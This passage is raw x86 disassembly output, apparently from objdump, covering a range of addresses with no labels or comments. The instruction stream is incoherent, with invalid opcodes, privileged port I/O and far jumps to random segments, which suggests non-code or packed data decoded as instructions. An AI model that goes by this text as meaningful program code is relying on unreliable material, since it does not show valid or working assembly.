  42a17d:	and    DWORD PTR [ebp+ecx*8-0x267f6b23],edx
  42a184:	out    0x98,eax
  42a186:	pusha  
  42a187:	xchg   DWORD PTR [ecx],esi
  42a189:	ror    DWORD PTR [edx*1+0x6223581d],cl
  42a190:	push   eax
  42a191:	mov    ah,BYTE PTR [edi]
  42a193:	jmp    0xe84c:0x6c099a18
  42a19a:	test   al,0x81
  42a19c:	sub    bl,dl
  42a19e:	(bad)  
  42a19f:	arpl   WORD PTR [ecx+0x65],bp
  42a1a2:	je     0x42a1c4
  42a1a4:	in     al,dx
  42a1a5:	aad    0x32
  42a1a7:	inc    ebx
  42a1a8:	sbb    al,0xa6
  42a1aa:	daa    
  42a1ab:	inc    eax
  42a1ac:	pop    es
  42a1ad:	push   0xffffffcc
  42a1af:	test   al,0x87
  42a1b1:	cld    
  42a1b2:	adc    esp,esp
  42a1b4:	or     eax,0x5a9f7ebe
  42a1b9:	das    
  42a1ba:	retf   
  42a1bb:	push   ds
  42a1bc:	cwde   
  42a1bd:	jo     0x42a1b7
  42a1bf:	jnp    0x42a1a6
  42a1c1:	in     al,dx
  42a1c2:	lds    eax,FWORD PTR [edi]
  42a1c4:	repz xlat BYTE PTR ds:[ebx]
  42a1c6:	in     eax,0x24
  42a1c8:	scas   eax,DWORD PTR es:[edi]
  42a1c9:	xchg   DWORD PTR [edi],esp
  42a1cb:	test   al,0x15
  42a1cd:	add    DWORD PTR [ecx],esp
  42a1cf:	sub    DWORD PTR ds:0x81450e18,esp
  42a1d5:	dec    ebx
  42a1d6:	into   
  42a1d7:	xlat   BYTE PTR ds:[ebx]
  42a1d8:	push   0xfffffff4
  42a1da:	jnp    0x42a238
  42a1dc:	arpl   WORD PTR [ebp-0x221739ba],cx
  42a1e2:	sub    dl,BYTE PTR [edx]
  42a1e4:	cwde   
  42a1e5:	jmp    0x3abc29ac
  42a1ea:	scas   eax,DWORD PTR es:[edi]
  42a1eb:	pushf  
  42a1ec:	rcr    BYTE PTR ds:0x2305e08f,1
  42a1f2:	xchg   DWORD PTR [eax+0xc],esi
  42a1f5:	imul   ebp,DWORD PTR ds:0x94cce4f7,0xffffff94
  42a1fc:	and    BYTE PTR [ebp+0x3d6ebd02],bl
  42a202:	repnz xor eax,0xba0cca15
  42a208:	les    ebp,FWORD PTR [ebp+0x70]
  42a20b:	pop    ss
  42a20c:	mov    ah,0xd4
  42a20e:	shr    BYTE PTR [ebx],1
  42a210:	addr16 push edi
  42a212:	call   0x9c1f564e
  42a217:	cdq    
  42a218:	mov    bh,BYTE PTR [ecx]
  42a21a:	lds    eax,FWORD PTR [ebx+0x2dd684f6]
  42a220:	push   0xffffffe2
  42a222:	mov    esp,0xe270f626
  42a227:	xchg   ecx,eax
  42a228:	pop    ecx
  42a229:	mov    ebp,0x1f6f4f18
  42a22e:	jp     0x42a284
  42a230:	aas    
  42a231:	rcr    DWORD PTR [ecx],0xf3
  42a234:	xchg   esi,eax
  42a235:	sub    DWORD PTR [ecx+0x17],ebp
  42a238:	and    ebx,DWORD PTR [ecx]
  42a23a:	mov    ebp,0xbe11995
  42a23f:	sbb    DWORD PTR [esi-0x74adf8a7],ebp
  42a245:	daa    
  42a246:	call   0xcc4a:0x2b2d022c
  42a24d:	stos   BYTE PTR es:[edi],al
  42a24e:	xor    ecx,ebx
  42a250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a251:	mov    ecx,DWORD PTR [ebp+0x67bc2d2c]
  42a257:	mov    esp,ebp
  42a259:	push   0xe15db4b1
  42a25e:	and    bl,BYTE PTR ds:0xd0f94a03
  42a264:	into   
  42a265:	xlat   BYTE PTR ds:[ebx]
  42a266:	xor    esp,DWORD PTR [edx]
  42a268:	and    esi,DWORD PTR [edx+0x1c]
  42a26b:	push   ss
  42a26c:	scas   eax,DWORD PTR es:[edi]
  42a26d:	mov    esi,0x0
	...
  42a2d6:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42a2dc:	scas   eax,DWORD PTR es:[edi]
  42a2dd:	mov    bh,0x1a
  42a2df:	aas    
  42a2e0:	scas   al,BYTE PTR es:[edi]
  42a2e1:	fst    DWORD PTR [eax+0x67710db0]
  42a2e7:	les    eax,FWORD PTR [ecx]
  42a2e9:	add    BYTE PTR [eax],al
  42a2eb:	add    DWORD PTR [eax],eax
  42a2ed:	add    BYTE PTR [ebp+0x3c],ch
  42a2f0:	repz push 0x5489d416
  42a2f6:	fwait
  42a2f7:	pop    es
  42a2f8:	inc    esp
  42a2f9:	jb     0x42a33b
  42a2fb:	cmp    ch,BYTE PTR [edi]
  42a2fd:	leave  
  42a2fe:	dec    esi
  42a2ff:	jge    0x42a342
  42a301:	clc    
  42a302:	sbb    bl,BYTE PTR [ebp-0x72]
  42a305:	shr    edi,1
  42a307:	jo     0x42a32c
  42a309:	imul   ebp,DWORD PTR [ecx+0x3a],0x5b624c8
  42a310:	mov    bh,0x19
  42a312:	(bad)  [esi-0xcc1f194]
  42a318:	cmp    ebp,eax
  42a31a:	div    BYTE PTR [edi]
  42a31c:	cmc    
  42a31d:	das    
  42a31e:	and    edx,edi
  42a320:	push   ss
  42a321:	fld    QWORD PTR [edi-0x16]
  42a324:	jno    0x42a2ee
  42a326:	mov    bh,0x27
  42a328:	scas   al,BYTE PTR es:[edi]
  42a329:	xchg   BYTE PTR [eax+0x37],al
  42a32c:	mov    dh,0x57
  42a32e:	inc    ecx
  42a32f:	cmp    DWORD PTR [eax],edi
  42a331:	out    0xba,eax
  42a333:	xchg   ebp,eax
  42a334:	or     DWORD PTR [ecx],ebx
  42a336:	cs test al,0x24
  42a339:	gs out dx,al
  42a33b:	das    
  42a33c:	(bad)  
  42a33d:	dec    ebp
  42a33e:	rcr    BYTE PTR [ebx-0x62],1
  42a341:	sbb    eax,0x95920481
  42a346:	inc    edi
  42a347:	fidiv  WORD PTR [ebx]
  42a349:	dec    BYTE PTR [ebp+eax*1+0x61]
  42a34d:	rcr    DWORD PTR [esi],1
  42a34f:	add    ah,BYTE PTR [ebp-0x5c]
  42a352:	pop    ecx
  42a353:	ret    0xf0fb
  42a356:	sub    al,0x7
  42a358:	es ins BYTE PTR es:[edi],dx
  42a35a:	daa    
  42a35b:	and    esi,ebp
  42a35d:	and    al,0x9d
  42a35f:	loopne 0x42a3d5
  42a361:	xchg   esp,eax
  42a362:	mov    ds:0x3f0a84a4,al
  42a367:	adc    ah,BYTE PTR [ebp-0x6e9ae0af]
  42a36d:	dec    edx
  42a36e:	mov    al,0x37
  42a370:	fsubrp st(6),st
  42a372:	int3   
  42a373:	das    
  42a374:	push   cs
  42a375:	sbb    eax,0xb0f72922
  42a37a:	add    dl,BYTE PTR [ebx+0x9]
  42a37d:	push   ecx
  42a37e:	jne    0x42a343
  42a380:	sbb    DWORD PTR ds:0xfbe5230c,eax
  42a386:	xchg   ecx,eax
  42a387:	call   0xecf:0xed0e9427
  42a38e:	icebp  
  42a38f:	cmp    bh,BYTE PTR [ecx-0x52522107]
  42a395:	inc    ebp
  42a396:	add    eax,0xe4fa9eba
  42a39b:	fcomi  st,st(2)
  42a39d:	stc    
  42a39e:	adc    esp,DWORD PTR [esi+0x1141e4ae]
  42a3a4:	or     BYTE PTR [ebp-0x55057348],bh
  42a3aa:	arpl   WORD PTR [edx-0x3f548c3d],sp
  42a3b0:	(bad)  [ecx]
  42a3b2:	aad    0x85
  42a3b4:	(bad)
  42a3b7:	inc    edx
  42a3b8:	jno    0x42a39f
  42a3ba:	jae    0x42a415
  42a3bc:	mov    edi,0x88c7518b
  42a3c1:	push   ds
  42a3c2:	rcl    BYTE PTR [esi-0x52],cl
  42a3c5:	mov    ch,0x20
  42a3c7:	push   eax
  42a3c8:	push   edi
  42a3c9:	jno    0x42a355
  42a3cb:	ss jmp 0xa1ca:0xdd26f058
  42a3d3:	cmc    
  42a3d4:	jne    0x42a402
  42a3d6:	pop    esi
  42a3d7:	(bad)
  42a3db:	sbb    ebp,DWORD PTR [edi+0x27e74107]
  42a3e1:	lock mov cs,WORD PTR gs:[esi+0x2f]
  42a3e6:	adc    al,0x66
  42a3e8:	adc    DWORD PTR [edx-0x27],ecx
  42a3eb:	fwait
  42a3ec:	push   ebp
  42a3ed:	cmp    DWORD PTR [eax],eax
	...
  42a453:	add    BYTE PTR [eax],al
  42a455:	add    BYTE PTR [edi+0xe],bh
  42a458:	jne    0x42a495
  42a45a:	jne    0x42a4d7
  42a45c:	jg     0x42a4ac
  42a45e:	loop   0x42a4c9
  42a460:	mov    ebp,0x67464f3d
  42a465:	out    dx,al
  42a466:	lds    eax,FWORD PTR [bx+di]
  42a469:	add    BYTE PTR [eax],al
  42a46b:	add    DWORD PTR [eax],eax
  42a46d:	add    BYTE PTR [esi+ebx*1-0x66],ah
  42a471:	call   0x356:0x28fe12c0
  42a478:	push   esp
  42a479:	enter  0xc603,0x70
  42a47d:	in     eax,dx
  42a47e:	dec    ebp
  42a47f:	push   edx
  42a480:	test   dh,0xc4
  42a483:	mov    edi,0x7a61f048
  42a488:	push   cs
  42a489:	loope  0x42a42e
  42a48b:	test   eax,0x631b03b7
  42a490:	dec    esp
  42a491:	outs   dx,BYTE PTR ds:[esi]
  42a492:	inc    edi
  42a493:	mov    ch,0x65
  42a495:	cwde   
  42a496:	or     al,0x41
  42a498:	xor    DWORD PTR [ecx],edi
  42a49a:	into   
  42a49b:	ret    
  42a49c:	or     DWORD PTR [edi+ebp*2],ecx
  42a49f:	test   al,0x3a
  42a4a1:	sbb    DWORD PTR [ebx-0x65],ebx
  42a4a4:	lock stc 
  42a4a6:	add    eax,0xc1c8a9a4
  42a4ab:	xor    DWORD PTR [ecx+0x7c],edi
  42a4ae:	mov    ebx,DWORD PTR [ebx+0x35]
  42a4b1:	jmp    0xb79b:0x4637a204
  42a4b8:	xchg   ebp,eax
  42a4b9:	mov    edx,0x1ec4173c
  42a4be:	sbb    eax,0xeea7e96
  42a4c3:	jmp    0x7f33:0x7fd4ebba
  42a4ca:	aas    
  42a4cb:	add    BYTE PTR [eax+0x603d4e97],bl
  42a4d1:	add    ah,BYTE PTR [ecx-0x563ef38a]
  42a4d7:	xchg   edi,eax
  42a4d8:	pushf  
  42a4d9:	sub    eax,0xf99f3569
  42a4de:	icebp  
  42a4df:	bound  ebx,QWORD PTR [esp+ebp*1]
  42a4e2:	test   DWORD PTR [edx+0x6e],eax
  42a4e5:	cs and bh,cl
  42a4e8:	add    dl,BYTE PTR ds:0x8ce4f9a1
  42a4ee:	sbb    ebp,edi
  42a4f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a4f1:	mov    eax,ds:0x96cb1686
  42a4f6:	imul   eax,DWORD PTR [esi-0x4f],0x7d
  42a4fa:	arpl   WORD PTR [esi+0x18],di
  42a4fd:	push   ss
  42a4fe:	dec    ecx
  42a4ff:	stc    
  42a500:	adc    BYTE PTR [ecx-0xb98fe82],al
  42a506:	sub    eax,0xd8041668
  42a50b:	push   ebx
  42a50c:	pop    esi
  42a50d:	xor    al,0x5b
  42a50f:	stos   BYTE PTR es:[edi],al
  42a510:	rcr    esi,0x1a
  42a513:	pop    edx
  42a514:	test   eax,0xf5a8db41
  42a519:	xlat   BYTE PTR ds:[ebx]
  42a51a:	push   esp
  42a51b:	ja     0x42a50c
  42a51d:	or     al,0x55
  42a51f:	push   ss
  42a520:	inc    eax
  42a521:	mov    eax,0x6d52e562
  42a526:	adc    BYTE PTR [edi],cl
  42a528:	and    esi,esp
  42a52a:	push   cs
  42a52b:	arpl   di,bp
  42a52d:	push   0x4945a7ae
  42a532:	jmp    0x6fd:0x15b44894
  42a539:	(bad)  
  42a53a:	imul   edx,DWORD PTR [ecx+edx*2],0x60
  42a53e:	fwait
  42a53f:	icebp  
  42a540:	out    0x83,eax
  42a542:	test   edi,ebx
  42a544:	jne    0x42a4e0
  42a546:	mov    ah,dh
  42a548:	mov    es,WORD PTR [eax]
  42a54a:	and    eax,0x72cfded4
  42a54f:	mov    bh,bh
  42a551:	aam    0x15
  42a553:	ret    
  42a554:	pop    es
  42a555:	mov    al,0x6e
  42a557:	dec    esp
  42a558:	sub    al,0x81
  42a55a:	pop    ebx
  42a55b:	xchg   ebp,eax
  42a55c:	or     al,0xf2
  42a55e:	mov    ch,0xe7
  42a560:	mov    ecx,0xd61fdf1f
  42a565:	dec    ebx
  42a566:	ficom  DWORD PTR [ecx]
  42a568:	ds push 0x20
  42a56b:	xchg   edi,eax
  42a56c:	mov    BYTE PTR [eax+0x0],bl
	...
  42a5d6:	sbb    BYTE PTR [edi+0x17],cl
  42a5d9:	mov    ecx,0xefbef957
  42a5de:	(bad)  
  42a5df:	cmc    
  42a5e0:	mov    edx,0xdc8dfc9f
  42a5e5:	cld    
  42a5e6:	mov    BYTE PTR [bx+di],0x0
  42a5ea:	add    BYTE PTR [ecx],al
  42a5ec:	add    BYTE PTR [eax],al
  42a5ee:	push   ebx
  42a5ef:	hlt    
  42a5f0:	pop    ebp
  42a5f1:	in     ax,dx
  42a5f3:	push   ss
  42a5f4:	into   
  42a5f5:	mov    es,WORD PTR [esi-0x69fbf5bd]
  42a5fb:	pop    ss
  42a5fc:	(bad)  [ecx]
  42a5fe:	bound  ecx,QWORD PTR [edi]
  42a600:	call   0xab2b2d8a
  42a605:	jge    0x42a680
  42a607:	jp     0x42a64b
  42a609:	lods   eax,DWORD PTR ds:[esi]
  42a60a:	and    DWORD PTR [edi],eax
  42a60c:	loop   0x42a650
  42a60e:	sub    DWORD PTR [edi],0x8c2e9efb
  42a614:	cs scas al,BYTE PTR es:[edi]
  42a616:	mov    ah,0xb5
  42a618:	pop    es
  42a619:	lea    esp,[edx-0x7f2513aa]
  42a61f:	outs   dx,DWORD PTR ds:[esi]
  42a620:	add    esi,edi
  42a622:	xor    BYTE PTR [edx+ecx*1],dl
  42a625:	test   BYTE PTR [edx+ecx*1-0x5deb8617],bl
  42a62c:	inc    ebx
  42a62d:	call   0xa39e:0x34e62805
  42a634:	je     0x42a5d1
  42a636:	imul   ebx,DWORD PTR [ecx+0x552b4ad2],0x6f
  42a63d:	outs   dx,DWORD PTR ds:[esi]
  42a63e:	stc    
  42a63f:	fidivr DWORD PTR [ebx-0x22747a5f]
  42a645:	pop    ecx
  42a646:	mov    ds:0x86e4c580,al
  42a64b:	lahf   
  42a64c:	test   DWORD PTR [ebp+0x43],0xc0951a96
  42a653:	loopne 0x42a683
  42a655:	jne    0x42a61f
  42a657:	int3   
  42a658:	xor    ebx,DWORD PTR [edx+0x33a83553]
  42a65e:	test   al,0x47
  42a660:	add    edx,esp
  42a662:	jnp    0x42a61a
  42a664:	mov    ds,WORD PTR [ebx+esi*8+0x17bc4bfa]
  42a66b:	(bad)
  42a66e:	je     0x42a6e8
  42a670:	jmp    esi
  42a672:	dec    esi
  42a673:	jle    0x42a667
  42a675:	and    BYTE PTR [edx+ebx*4],ah
  42a678:	repnz inc ebp
  42a67a:	icebp  
  42a67b:	push   0x44
  42a67d:	xchg   esp,eax
  42a67e:	mov    ebx,0x652f2f38
  42a683:	sbb    DWORD PTR [edx],esp
  42a685:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  42a687:	pop    edx
  42a688:	adc    eax,0xa221ba34
  42a68d:	out    0x11,eax
  42a68f:	add    eax,DWORD PTR [ecx]
  42a691:	sbb    al,0xf9
  42a693:	nop
  42a694:	ret    0xb46c
  42a697:	or     BYTE PTR [edi-0x1d243f2c],bh
  42a69d:	das    
  42a69e:	xchg   edi,eax
  42a69f:	es jecxz 0x42a65a
  42a6a2:	mov    ss,WORD PTR [edi-0x32]
  42a6a5:	sbb    al,0x11
  42a6a7:	pop    edx
  42a6a8:	sub    ch,al
  42a6aa:	dec    esi
  42a6ab:	xchg   esi,eax
  42a6ac:	sbb    al,0xca
  42a6ae:	scas   al,BYTE PTR es:[edi]
  42a6af:	out    0x18,eax
  42a6b1:	std    
  42a6b2:	clc    
  42a6b3:	cmc    
  42a6b4:	frstor [edx+0x5d]
  42a6b7:	add    eax,0x8f35e43d
  42a6bc:	outs   dx,BYTE PTR ds:[esi]
  42a6bd:	or     al,0x3e
  42a6bf:	mov    WORD PTR [ecx],es
  42a6c1:	mov    esi,0xd7203ad
  42a6c6:	lods   eax,DWORD PTR ds:[esi]
  42a6c7:	jp     0x42a6e5
  42a6c9:	das    
  42a6ca:	pop    es
  42a6cb:	in     al,dx
  42a6cc:	and    edx,DWORD PTR [esi]
  42a6ce:	fwait
  42a6cf:	mov    ds:0xb93df8e9,al
  42a6d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a6d5:	aam    0xc
  42a6d7:	cmp    DWORD PTR [ebp+0x24],0xe759c13d
  42a6de:	pushf  
  42a6df:	loopne 0x42a6f3
  42a6e1:	imul   ecx,DWORD PTR [edi+0x74],0xe10b8c2
  42a6e8:	out    0x14,al
  42a6ea:	fadd   DWORD PTR [esi]
  42a6ec:	shr    bh,cl
	...
  42a756:	and    al,0x16
  42a758:	outs   dx,BYTE PTR ds:[esi]
  42a759:	(bad)  
  42a75a:	jle    0x42a75b
  42a75c:	lods   eax,DWORD PTR ds:[esi]
  42a75d:	test   DWORD PTR [edi+0xcb8131c],0x674e4271
  42a767:	mov    DWORD PTR [ecx],0x10000
  42a76d:	add    BYTE PTR [edi-0x37],bl
  42a770:	mov    eax,ds:0x454c2ddb
  42a775:	ins    DWORD PTR es:[edi],dx
  42a776:	std    
  42a777:	push   0xffffffe9
  42a779:	call   0x2cb:0xa64a2ce8
  42a780:	jg     0x42a7df
  42a782:	imul   eax,DWORD PTR [esi-0x14],0xf5d44684
  42a789:	loope  0x42a74d
  42a78b:	(bad)  
  42a78d:	jmp    0x42a79d
  42a78f:	iret   
  42a790:	mov    ds:0x9a78a44c,eax
  42a795:	mov    ds,WORD PTR [ecx+ebx*4]
  42a798:	pushf  
  42a799:	(bad)  
  42a79a:	out    0x6f,al
  42a79c:	addr16 popa 
  42a79e:	(bad)  
  42a79f:	jmp    0x42a796
  42a7a1:	push   ecx
  42a7a2:	and    ebp,DWORD PTR [esp+eiz*8-0x40431e39]
  42a7a9:	stos   BYTE PTR es:[edi],al
  42a7aa:	popa   
  42a7ab:	push   esp
  42a7ac:	out    dx,eax
  42a7ad:	inc    esp
  42a7ae:	xchg   edi,eax
  42a7af:	jne    0x42a7ab
  42a7b1:	pushf  
  42a7b2:	push   ebp
  42a7b3:	or     bl,BYTE PTR [edi+0x5012754b]
  42a7b9:	jp     0x42a813
  42a7bb:	test   DWORD PTR [ebp-0x69],eax
  42a7be:	mov    DWORD PTR [ecx+0x3c],edi
  42a7c1:	and    edx,esi
  42a7c3:	pushf  
  42a7c4:	outs   dx,BYTE PTR ds:[esi]
  42a7c5:	and    DWORD PTR [eax+0x11],eax
  42a7c8:	dec    esi
  42a7c9:	out    dx,eax
  42a7ca:	ffree  st(5)
  42a7cc:	dec    edi
  42a7cd:	repnz xchg esi,eax
  42a7cf:	out    0xf7,eax
  42a7d1:	imul   esi,edx,0xffffffba
  42a7d4:	js     0x42a838
  42a7d6:	xchg   edx,eax
  42a7d7:	out    0x38,al
  42a7d9:	aas    
  42a7da:	jge    0x42a82b
  42a7dc:	fadd   DWORD PTR [esi+0x412dd62c]
  42a7e2:	xor    eax,0x23cfb169
  42a7e7:	fwait
  42a7e8:	pop    esi
  42a7e9:	mov    ebp,0xf2055f04
  42a7ee:	imul   ebx,DWORD PTR [edi],0x31
  42a7f1:	ret    0xb170
  42a7f4:	retf   0xf6a9
  42a7f7:	pop    ebp
  42a7f8:	fcomp  QWORD PTR [ecx+eax*8]
  42a7fb:	es jp  0x42a83f
  42a7fe:	adc    esp,eax
  42a800:	cli    
  42a801:	pop    eax
  42a802:	(bad)  
  42a803:	jmp    0x347bb87c
  42a808:	loopne 0x42a846
  42a80a:	leave  
  42a80b:	aaa    
  42a80c:	pop    ebx
  42a80d:	and    cl,BYTE PTR [edx-0x46]
  42a810:	xor    BYTE PTR [esi],ah
  42a812:	cwde   
  42a813:	in     al,dx
  42a814:	jne    0x42a7fc
  42a816:	ret    0x68bd
  42a819:	pop    edx
  42a81a:	mov    ah,0xf7
  42a81c:	xor    bh,BYTE PTR [ecx+0x50]
  42a81f:	in     al,dx
  42a820:	jg     0x42a88c
  42a822:	mov    WORD PTR [ebx-0x6ab42e86],ss
  42a828:	jb     0x42a88a
  42a82a:	adc    al,0x1b
  42a82c:	neg    BYTE PTR [edx+0x44]
  42a82f:	jp     0x42a8a6
  42a831:	and    dl,BYTE PTR [eax-0x5e]
  42a834:	sar    bh,0x7a
  42a837:	(bad)  
  42a838:	in     eax,dx
  42a839:	jp     0x42a873
  42a83b:	pop    DWORD PTR [ecx+0x7ba76e36]
  42a841:	imul   eax,DWORD PTR [eax+0x24],0xad9f68df
  42a848:	aas    
  42a849:	fistp  QWORD PTR es:[ebx+0x29]
  42a84d:	fld    DWORD PTR [eax-0x5944872d]
  42a853:	or     eax,DWORD PTR ds:0x67cc2bf3
  42a859:	dec    esp
  42a85a:	shr    DWORD PTR [ebp+esi*1+0x142352b0],cl
  42a861:	nop
  42a862:	inc    ebp
  42a863:	inc    ebp
  42a864:	pop    esi
  42a865:	mov    esp,0xd4021aba
  42a86a:	gs xchg edi,ebp
  42a86d:	inc    edx
	...
  42a8d6:	mov    ah,BYTE PTR [ebp+0x63]
  42a8d9:	mov    edi,0x75debfef
  42a8de:	add    ebp,0xec186c97
  42a8e4:	lea    ebp,[edx+0x67]
  42a8e7:	enter  0x1,0x0
  42a8eb:	add    DWORD PTR [eax],eax
  42a8ed:	add    BYTE PTR [eax],cl
  42a8ef:	mov    bh,0xd7
  42a8f1:	stos   BYTE PTR es:[edi],al
  42a8f2:	loop   0x42a87c
  42a8f4:	shr    BYTE PTR ds:0x279cf7da,cl
  42a8fa:	int    0x73
  42a8fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a8fd:	push   0x9c0d0032
  42a902:	in     eax,0x3f
  42a904:	sub    DWORD PTR [ebp+0x23],eax
  42a907:	inc    ecx
  42a908:	mov    edi,0x71a26f81
  42a90d:	jb     0x42a8a3
  42a90f:	mov    esi,0xc50af6f
  42a914:	mov    ds:0xce34cb2e,al
  42a919:	cmp    BYTE PTR [edx+0x7632a52b],bh
  42a91f:	icebp  
  42a920:	mov    ah,0xed
  42a922:	jle    0x42a95f
  42a924:	std    
  42a925:	pop    ss
  42a926:	xchg   esi,eax
  42a927:	lock jo 0x42a99b
  42a92a:	adc    ebp,ebp
  42a92c:	cmp    edx,DWORD PTR [edi-0x45]
  42a92f:	call   0xc11fd07d
  42a934:	jmp    0x42a984
  42a936:	and    eax,0xef36d9a1
  42a93b:	xlat   BYTE PTR ds:[ebx]
  42a93c:	js     0x42a934
  42a93e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a93f:	out    dx,eax
  42a940:	shr    DWORD PTR [edi-0x5b],cl
  42a943:	mov    dl,0x8b
  42a945:	sahf   
  42a946:	push   ebx
  42a947:	int    0x6
  42a949:	hlt    
  42a94a:	adc    WORD PTR [eax],cx
  42a94d:	add    DWORD PTR [ebp+0x3364d3ab],ecx
  42a953:	mov    al,0xd
  42a955:	pop    edx
  42a956:	inc    edi
  42a957:	out    0x2e,eax
  42a959:	xor    edi,DWORD PTR [ebp-0x7c91e395]
  42a95f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a960:	dec    eax
  42a961:	xchg   ebp,eax
  42a962:	mov    eax,0x2b7ce773
  42a967:	int3   
  42a968:	xor    edi,DWORD PTR [edi+eiz*4-0x71]
  42a96c:	loop   0x42a97d
  42a96e:	(bad)  
  42a96f:	fidivr DWORD PTR [esi+0x20534350]
  42a975:	in     al,dx
  42a976:	popf   
  42a977:	sbb    al,0xd3
  42a979:	js     0x42a9be
  42a97b:	scas   al,BYTE PTR es:[edi]
  42a97c:	mov    esi,0xf93ee6c3
  42a981:	mov    esp,0x81c60407
  42a986:	mov    BYTE PTR [ebp+0x4dc8259d],dh
  42a98c:	jo     0x42a91d
  42a98e:	cmp    al,0x40
  42a990:	mov    dl,0x5e
  42a992:	icebp  
  42a993:	js     0x42a98d
  42a995:	pop    esp
  42a996:	jb     0x42a91b
  42a998:	mov    esp,0xee11de4a
  42a99d:	mov    ecx,0x48776dce
  42a9a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a9a3:	retf   
  42a9a4:	inc    edi
  42a9a5:	repnz outs dx,BYTE PTR ds:[esi]
  42a9a7:	leave  
  42a9a8:	fidivr DWORD PTR [eax+0xa]
  42a9ab:	push   ds
  42a9ac:	scas   al,BYTE PTR es:[edi]
  42a9ad:	cs loopne 0x42a9d3
  42a9b0:	push   ss
  42a9b1:	or     dh,al
  42a9b3:	add    DWORD PTR [edx-0x62],esp
  42a9b6:	scas   al,BYTE PTR es:[edi]
  42a9b7:	mov    esi,0x6e6b6142
  42a9bc:	mov    dl,0xa4
  42a9be:	and    BYTE PTR [ebx+0x2d],al
  42a9c1:	js     0x42a9bc
  42a9c3:	call   0x14e106
  42a9c8:	mov    esi,0x3fccf121
  42a9cd:	push   edx
  42a9ce:	mov    dh,0x89
  42a9d0:	call   0x45ef:0xf69af63f
  42a9d7:	pusha  
  42a9d8:	repnz data16 fst QWORD PTR [ebp+0x313e2869]
  42a9e0:	dec    ebp
  42a9e1:	clc    
  42a9e2:	inc    esp
  42a9e3:	jne    0x42a9df
  42a9e5:	push   0x7e
  42a9e7:	mov    ah,0x51
  42a9e9:	inc    edx
  42a9ea:	mov    dh,0x2d
  42a9ec:	mov    dh,0x9c
	...
  42aa56:	test   al,0x93
  42aa58:	sbb    eax,0xfbee3fee
  42aa5d:	xlat   BYTE PTR ds:[ebx]
  42aa5e:	in     eax,0xd3
  42aa60:	aad    0x7
  42aa62:	cmp    eax,0x6797dd7f
  42aa67:	leave  
  42aa68:	add    DWORD PTR [eax],eax
  42aa6a:	add    BYTE PTR [ecx],al
  42aa6c:	add    BYTE PTR [eax],al
  42aa6e:	mov    dh,0x4
  42aa70:	mov    cl,dl
  42aa72:	cmovge eax,esi
  42aa75:	leave  
  42aa76:	fchs   
  42aa78:	xor    cl,dh
  42aa7a:	cmp    DWORD PTR [edi-0x21],edx
  42aa7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aa7e:	mov    BYTE PTR [eax+0x28],al
  42aa81:	loope  0x42aa8d
  42aa83:	and    al,0x95
  42aa85:	dec    ecx
  42aa86:	mov    dh,BYTE PTR [edi+0x32]
  42aa89:	add    dl,BYTE PTR [eax]
  42aa8b:	inc    BYTE PTR [ebx]
  42aa8d:	std    
  42aa8e:	sbb    al,0xc6
  42aa90:	lods   eax,DWORD PTR ds:[esi]
  42aa91:	dec    ebx
  42aa92:	nop
  42aa93:	jg     0x42aab8
  42aa95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aa96:	in     al,0x7f
  42aa98:	mul    DWORD PTR [esi-0x7f854512]
  42aa9e:	aaa    
  42aa9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aaa0:	adc    al,0x1
  42aaa2:	xor    eax,0x95aa63a7
  42aaa7:	cmp    DWORD PTR [esi],eax
  42aaa9:	ret    
  42aaaa:	lods   al,BYTE PTR ds:[esi]
  42aaab:	cmp    eax,0xb3ad80df
  42aab0:	xchg   BYTE PTR [ebx+0x1b23e533],cl
  42aab6:	out    0x57,ax
  42aab9:	push   ecx
  42aaba:	test   BYTE PTR [esi-0x32c34b8b],0xbe
  42aac1:	nop
  42aac2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aac3:	dec    ebp
  42aac4:	or     BYTE PTR [ebx-0x21bea19],0x89
  42aacb:	mov    edi,0xcc82e07b
  42aad0:	xchg   ebx,eax
  42aad1:	pop    es
  42aad2:	(bad)  
  42aad4:	sar    DWORD PTR [edx-0x3e],0x7
  42aad8:	cmp    ebx,esp
  42aada:	inc    eax
  42aadb:	jl     0x42aabb
  42aadd:	sbb    BYTE PTR [edx-0x52777550],bh
  42aae3:	add    ebp,DWORD PTR [eax-0x5]
  42aae6:	jmp    0xcbd87404
  42aaeb:	lea    eax,[eax-0xc0ec4ff]
  42aaf1:	xor    al,0x4b
  42aaf3:	dec    edi
  42aaf4:	fcomp  DWORD PTR [ebx+0x676906fe]
  42aafa:	jns    0x42aa8a
  42aafc:	mov    ch,0xeb
  42aafe:	mov    BYTE PTR [esi+edx*1-0x6d],bl
  42ab02:	mov    dl,0xb2
  42ab04:	shr    BYTE PTR [edx],cl
  42ab06:	in     eax,dx
  42ab07:	pop    eax
  42ab08:	xor    bl,BYTE PTR [ebx-0x3c047bab]
  42ab0e:	nop
  42ab0f:	in     eax,0xd3
  42ab11:	repz (bad) [eax]
  42ab14:	test   al,0x9b
  42ab16:	in     eax,0x4f
  42ab18:	adc    cl,BYTE PTR [esi+0x29502f59]
  42ab1e:	adc    BYTE PTR [ecx-0x17a8ed1c],cl
  42ab24:	js     0x42ab19
  42ab26:	dec    esi
  42ab27:	add    DWORD PTR ds:0x4d402114,esp
  42ab2d:	push   0x64
  42ab2f:	aam    0xa0
  42ab31:	lods   al,BYTE PTR ds:[esi]
  42ab32:	add    eax,0x65c14385
  42ab37:	sub    eax,0x77b9b7a6
  42ab3c:	inc    eax
  42ab3d:	fld    st(1)
  42ab3f:	shr    BYTE PTR [ebx-0x68ebc1c],1
  42ab45:	jmp    0x42ab7e
  42ab47:	fs adc al,0xb5
  42ab4a:	mov    WORD PTR [ebp+0x6c5a1cab],es
  42ab50:	sub    DWORD PTR [ebp-0x12],ebp
  42ab53:	xchg   ebp,eax
